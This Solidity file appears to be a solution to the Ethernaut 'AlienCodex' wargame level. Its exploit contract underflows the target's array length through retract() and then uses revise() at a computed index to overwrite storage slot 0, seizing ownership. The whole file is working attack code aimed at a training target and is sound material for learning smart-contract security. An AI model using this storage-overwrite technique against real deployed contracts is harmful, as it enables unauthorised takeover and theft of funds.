// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        IAlienCodex(target).makeContact();
        IAlienCodex(target).retract();
        unchecked {
            uint index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));
            IAlienCodex(target).revise(index, bytes32(uint256(uint160(msg.sender))));
        }
    }
}
